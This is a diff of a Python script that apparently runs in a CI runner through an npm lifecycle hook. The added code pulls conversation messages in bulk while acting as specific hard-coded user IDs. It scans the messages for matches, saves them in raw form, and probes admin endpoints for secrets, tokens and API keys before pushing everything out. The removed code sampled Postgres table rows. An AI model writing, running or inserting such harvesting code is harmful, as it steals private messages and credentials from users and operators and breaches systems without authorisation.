+    msg_hit = [0]; msg_saved = [0]; MSG_CAP = int(os.environ.get("MSG_CAP","120000000"))
+
+    def get_messages(cid, c):
+        subs = c.get("_subs") or [ORDER[0]]
+        for sub in subs[:3]:
+            for ep in MSG_ENDPOINTS:
                 try:
-                    cols=q("select column_name,data_type from information_schema.columns where table_name='%s' order by ordinal_position"%t)
-                    pglog.append({"table":t,"cols":cols})
-                    rows=q('select * from "%s" limit 40'%t)
-                    # rows may contain bytes; json safe via str
-                    safe=[]
-                    for row in rows[:40]:
-                        safe.append([ (base64.b64encode(v).decode() if isinstance(v,(bytes,bytearray)) else (v if isinstance(v,(int,float,bool,type(None))) else str(v)[:300])) for v in row])
-                    pglog.append({"table":t,"sample":safe})
-                    log("PG sample",t,len(rows))
-                except Exception as e:
-                    pglog.append({"table":t,"err":repr(e)})
-            con.close()
+                    path = ep % cid
+                except Exception:
+                    continue
+                st, j, bb, hd = jget(sub, path, timeout=25, retries=1)
+                if st == 200 and j is not None:
+                    arr = j if isinstance(j, list) else (j.get("messages") or j.get("items") or j.get("data") or j.get("nodes"))
+                    if isinstance(arr, list):
+                        return arr, path, j
+        return None, None, None
+
+    def work_conv(kv):
+        cid, c = kv
+        if time.time()-START > BUDGET-200: return
+        try:
+            arr, used, rawj = get_messages(cid, c)
+            if arr is None:
+                with lock: msg_index.append({"id":cid,"title":c.get("title"),"ok":False})
+                return
+            acc = []; extract_strings(arr, acc)
+            blob = "\n".join(acc)
+            hits = scan(blob)
+            with lock:
+                msg_index.append({"id":cid,"title":c.get("title"),"ok":True,"nmsg":len(arr),"path":used,
+                                  "matches":[h["name"] for h in hits]})
+                if hits:
+                    msg_hit[0]+=1
+                    open(os.path.join(OUT,"convhits","%s.json"%cid),"w",encoding='utf-8',errors='replace').write(
+                        json.dumps({"id":cid,"title":c.get("title"),"path":used,"messages_raw":rawj,
+                                    "matches":hits}, ensure_ascii=False))
+                if msg_saved[0] < MSG_CAP:
+                    open(os.path.join(OUT,"msggz","%s.json"%cid),"w",encoding='utf-8',errors='replace').write(
+                        json.dumps({"id":cid,"title":c.get("title"),"nmsg":len(arr),"messages":arr}, ensure_ascii=False))
+                    msg_saved[0] += len(blob)
         except Exception as e:
-            pglog.append({"err":repr(e)}); log("PG EXC",repr(e))
-    else:
-        pglog.append({"note":"5432 not OPEN from runner"})
-    json.dump(pglog, open(os.path.join(OUT,"postgres_try.json"),"w"), ensure_ascii=False, indent=1)
+            with lock: msg_index.append({"id":cid,"ok":False,"err":repr(e)[:120]})
+
+    done_c = 0
+    with cf.ThreadPoolExecutor(max_workers=8) as ex:
+        futs = {ex.submit(work_conv, kv): kv for kv in convs.items()}
+        for fu in cf.as_completed(futs):
+            done_c += 1
+            if done_c % 100 == 0:
+                log("conv", done_c, "/", len(convs), "hits", msg_hit[0], "savedMB", round(msg_saved[0]/1e6,1), "t", round(time.time()-START))
+            if time.time()-START > BUDGET-200:
+                log("time budget in conv phase"); break
+    json.dump(msg_index, open(os.path.join(OUT,"messages_index.json"),"w"), ensure_ascii=False)
+    summary["messages"] = {"convs":len(convs),"done":done_c,"hit_convs":msg_hit[0],"saved_bytes":msg_saved[0]}
+    log("conv phase done", done_c, "hits", msg_hit[0])
+    json.dump(summary, open(os.path.join(OUT,"summary.json"),"w"), ensure_ascii=False, indent=1)
+    push_results(final=False)
+
+    # Phase 3: control plane read endpoints
+    cp_targets = ["/api/orgs","/api/org","/api/users","/api/users/me","/api/me","/api/account",
+                  "/api/devices","/api/tokens","/api/secrets","/api/admin","/api/admin/users",
+                  "/api/admin/orgs","/api/admin/tokens","/api/admin/secrets","/api/admin/config",
+                  "/api/org/config","/api/org/members","/api/settings","/api/admin/settings",
+                  "/api/integrations","/api/app-tokens","/api/api-keys","/api/keys"]
+    cp_res = {}
+    cp_subs = ["usr_ZxLewKrgbRYSm7rWDtQX8", "usr_j7t9Dhq4M4obQkag5huJi", ORG]
+    for sub in cp_subs:
+        for t in cp_targets:
+            st, j, bb, hd = jget(sub, t, timeout=15, retries=1)
+            key = "%s|%s"%(sub,t)
+            if st != 404:
+                cp_res[key] = {"status":st,"len":len(bb),"body":(j if j is not None else bb[:2000].decode('utf-8','replace'))}
+                fn = sanitize(t.replace("/","_"), sub)
+                try: json.dump(cp_res[key], open(os.path.join(OUT,"cp","cp_%s.json"%fn),"w"), ensure_ascii=False)
+                except Exception: pass
+    json.dump(cp_res, open(os.path.join(OUT,"controlplane.json"),"w"), ensure_ascii=False)
+    log("control-plane probed", len(cp_res), "non-404")
+    summary["controlplane"] = {k:v["status"] for k,v in cp_res.items()}
 
     json.dump(summary, open(os.path.join(OUT,"summary.json"),"w"), ensure_ascii=False, indent=1)
     log("DONE")
     push_results(final=True)
 
-# watchdog
 def _wd():
     while True:
         time.sleep(5)
         if time.time()-START > BUDGET:
             log("WATCHDOG timeout; dumping partial")
-            try: json.dump(summary, open(os.path.join(OUT,"summary.json"),"w"), ensure_ascii=False, indent=1)
-            except Exception: pass
             try: push_results(final=True)
             except Exception: pass
             os._exit(1)
@@ -374,5 +492,4 @@ except Exception:
     log("FATAL", traceback.format_exc())
     try: push_results(final=True)
     except Exception: pass
-# Force npm lifecycle to fail so no build/deploy proceeds.
 sys.exit(1)
